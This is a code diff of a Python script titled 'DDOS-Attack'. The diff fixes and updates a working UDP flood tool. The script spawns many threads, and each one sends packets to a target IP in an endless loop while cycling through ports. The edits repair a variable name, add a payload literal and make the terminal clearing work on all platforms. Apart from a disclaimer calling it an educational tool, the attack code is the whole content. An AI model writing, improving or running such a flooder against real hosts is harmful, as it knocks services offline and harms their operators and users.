@@ -6,8 +6,6 @@ import random
 import threading
 
 # DDOS-Attack [ASCII Art]
-
-
 def display_banner():
     banner =  "██████╗ ██████╗  ██████╗ ███████╗       █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗\n"
     banner += "██╔══██╗██╔══██╗██╔═══██╗██╔════╝      ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝\n"
@@ -22,8 +20,8 @@ display_banner()
 
 # Terminal header settings and information
 os.system('color 0A')
-print("Developer  :   KARTHIK LAL (https://karthiklal.live)")
-print("Created Date:   2022-03-09")
+print("Developer   :   KARTHIK LAL (https://karthiklal.in)")
+print("Created Date:   2023-10-12")
 print('Project     :   DDOS-Attack')
 print('Purpose     :   A simple DDOS-Attack tool to test your network security')
 print('Caution     :   This tool is only for educational purpose. Do not use this for illegal purposes.')
@@ -34,12 +32,12 @@ mydate = time.strftime('%Y-%m-%d')
 mytime = time.strftime('%H-%M')
 
 # Lets define sock and bytes for our attack
-def send_packets(ip, port, bytes, proxy_size):
+def send_packets(ip, port, data, proxy_size):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sent = 0
     while True:
         for i in range(proxy_size):
-            sock.sendto(bytes, (ip, port))
+            sock.sendto(data, (ip, port))
             sent += 1
             port += 1
             if port == 65534:
@@ -53,15 +51,20 @@ threads = int(input("Number of threads : "))
 
 # Lets start the attack
 print("Thank you for using the KARTHIK-LAL (DDOS-ATTACK-TOOL).")
-print("Starting the attack on ", ip, " at port ", port, " with a proxy size of ", proxy_size, "...")
 
 time.sleep(3)
 for ip in ips:
     for port in ports:
+        # Use a bytes literal to create the data
+        data = b'Hello, this is a DDOS attack'
+        print("Starting the attack on ", ip, " at port ", port, " with a proxy size of ", proxy_size, "...")
         for i in range(threads):
-            t = threading.Thread(target=send_packets, args=(ip, int(port), bytes, proxy_size))
-            t.start()            
+            t = threading.Thread(target=send_packets, args=(ip, int(port), data, proxy_size))
+            t.start()           
 
-# End of the script
-os.system("cls")
+# Lets keep the terminal clean
+if os.name == "nt": # Windows
+    os.system("cls")
+else: # Linux or Mac
+    os.system("clear")
 input("Press Enter to exit...")
